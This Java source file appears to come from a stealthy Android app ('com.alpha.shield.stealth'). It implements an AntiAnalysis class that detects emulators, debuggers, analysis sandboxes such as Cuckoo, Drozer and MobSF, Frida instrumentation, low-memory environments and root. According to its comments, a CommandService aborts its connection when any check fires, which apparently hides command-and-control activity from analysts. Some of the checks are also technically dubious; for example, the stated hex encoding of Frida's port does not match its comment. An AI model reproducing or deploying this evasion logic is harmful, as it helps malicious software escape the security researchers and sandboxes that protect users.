package com.alpha.shield.stealth;

import android.content.Context;
import android.os.Build;
import android.os.Debug;
import android.os.SystemClock;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

/**
 * AntiAnalysis — Alpha environment detection.
 *
 * Returns true from isThreat() when a likely analysis/emulator/sandbox
 * environment is detected. CommandService aborts connection if this fires.
 *
 * Checks performed:
 *   EMULATOR   — build props (QEMU, goldfish, vbox, etc.), CPU features
 *   DEBUGGER   — Debug.isDebuggerConnected(), ptrace timing delta
 *   SANDBOX    — known sandbox file paths, process names
 *   FRIDA      — libc maps scan, /proc/net/tcp port 27042, known pipe names
 *   ROOT       — su binary presence (also exposed for CommandService to report)
 *   TIMING     — abnormal boot time (emulators often start with low uptime)
 *   MEMORY     — abnormally low RAM (some sandboxes restrict to 512 MB)
 */
@Obfuscate
public class AntiAnalysis {

    private static final String TAG = "AA";

    // ── Main gate ─────────────────────────────────────────────────────────────

    public static boolean isThreat(Context ctx) {
        if (isEmulator())   { Log.w(TAG, "emulator"); return true; }
        if (isDebuggerAttached()) { Log.w(TAG, "debugger"); return true; }
        if (isSandbox())    { Log.w(TAG, "sandbox"); return true; }
        if (isFrida())      { Log.w(TAG, "frida");   return true; }
        if (isLowMemory(ctx)) { Log.w(TAG, "lowmem"); return true; }
        return false;
    }

    // ── Emulator ──────────────────────────────────────────────────────────────

    private static boolean isEmulator() {
        // Build props
        if (hasEmulatorBuildProps()) return true;
        // /dev/goldfish_pipe — specific to AOSP emulator
        if (new File("/dev/goldfish_pipe").exists()) return true;
        // Hypervisor CPU brand
        String cpuBrand = readFile("/proc/cpuinfo");
        if (cpuBrand != null) {
            String lower = cpuBrand.toLowerCase();
            if (lower.contains("qemu") || lower.contains("virtualbox")
                    || lower.contains("vmware")) return true;
        }
        return false;
    }

    private static boolean hasEmulatorBuildProps() {
        String[] suspects = {
                Build.FINGERPRINT, Build.MODEL, Build.MANUFACTURER,
                Build.BRAND,       Build.DEVICE, Build.PRODUCT
        };
        for (String s : suspects) {
            if (s == null) continue;
            String lower = s.toLowerCase();
            if (lower.contains("generic") || lower.contains("unknown")
                    || lower.contains("emulator") || lower.contains("sdk")
                    || lower.contains("vbox")  || lower.contains("genymotion")
                    || lower.contains("x86_64_root")) return true;
        }
        // Specific hardware ID for AOSP emulator
        return "goldfish".equals(Build.HARDWARE) || "ranchu".equals(Build.HARDWARE);
    }

    // ── Debugger ──────────────────────────────────────────────────────────────

    private static boolean isDebuggerAttached() {
        if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) return true;

        // Timing-based ptrace detection
        // A debugger attached via ptrace causes measurable slowdown in RDTSC/nanoTime
        long t0 = SystemClock.elapsedRealtimeNanos();
        for (int i = 0; i < 1000; i++) { /* tight loop */ }
        long delta = SystemClock.elapsedRealtimeNanos() - t0;
        // Emulators and debuggers typically produce deltas > 2 ms for this loop
        // (Real device: < 100 µs. Emulator: often > 2 ms)
        if (delta > 2_000_000L) return true;

        // /proc/self/status TracerPid
        String status = readFile("/proc/self/status");
        if (status != null) {
            for (String line : status.split("\n")) {
                if (line.startsWith("TracerPid:")) {
                    String pid = line.substring("TracerPid:".length()).trim();
                    if (!"0".equals(pid)) return true;
                }
            }
        }
        return false;
    }

    // ── Sandbox ───────────────────────────────────────────────────────────────

    private static boolean isSandbox() {
        String[] sandboxPaths = {
                "/data/app/com.android.vending-",
                "/data/dalvik-cache/arm/system@framework@boot.vdex",
                "/sdcard/ANALYSIS",
        };
        for (String p : sandboxPaths) {
            if (new File(p).exists()) return true;
        }

        // Check for known sandbox processes in /proc
        try {
            File proc = new File("/proc");
            String[] pids = proc.list();
            if (pids != null) {
                for (String pid : pids) {
                    if (!pid.matches("\\d+")) continue;
                    String cmdline = readFile("/proc/" + pid + "/cmdline");
                    if (cmdline != null && (
                            cmdline.contains("cuckoo")
                            || cmdline.contains("drozer")
                            || cmdline.contains("mobsf"))) {
                        return true;
                    }
                }
            }
        } catch (Exception ignored) {}

        return false;
    }

    // ── Frida ─────────────────────────────────────────────────────────────────

    private static boolean isFrida() {
        // Frida default port 27042 in /proc/net/tcp
        String tcp = readFile("/proc/net/tcp");
        if (tcp != null && tcp.contains("699A")) {  // 27042 in hex little-endian
            return true;
        }

        // Known Frida files in /proc/self/maps
        String maps = readFile("/proc/self/maps");
        if (maps != null && (maps.contains("frida") || maps.contains("re.frida")
                || maps.contains("gum-js-loop"))) {
            return true;
        }

        // Named pipe from Frida's gadget
        String[] fridaNames = {
                "/tmp/frida-",
                "/data/local/tmp/frida",
                "/data/local/tmp/re.frida.server",
        };
        for (String n : fridaNames) {
            if (new File(n).exists()) return true;
        }

        return false;
    }

    // ── Low memory ────────────────────────────────────────────────────────────

    private static boolean isLowMemory(Context ctx) {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                    ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) return false;
            android.app.ActivityManager.MemoryInfo mi =
                    new android.app.ActivityManager.MemoryInfo();
            am.getMemoryInfo(mi);
            // < 512 MB total RAM is suspicious (most real devices have ≥ 2 GB)
            return mi.totalMem < 512L * 1024 * 1024;
        } catch (Exception e) {
            return false;
        }
    }

    // ── Root check (non-threat, exposed for telemetry) ────────────────────────

    public static boolean hasRoot() {
        String[] suPaths = {
                "/sbin/su", "/system/bin/su", "/system/xbin/su",
                "/data/local/xbin/su", "/data/local/bin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su",
                "/data/local/su"
        };
        for (String p : suPaths) {
            if (new File(p).exists()) return true;
        }
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"which", "su"});
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(proc.getInputStream()));
            String line = br.readLine();
            proc.destroy();
            return line != null && !line.isEmpty();
        } catch (Exception e) {
            return false;
        }
    }

    // ── File read helper ──────────────────────────────────────────────────────

    private static String readFile(String path) {
        try {
            java.io.InputStream is = new java.io.FileInputStream(path);
            byte[] buf = new byte[4096];
            int read = is.read(buf);
            is.close();
            return read > 0 ? new String(buf, 0, read) : null;
        } catch (Exception e) {
            return null;
        }
    }
}
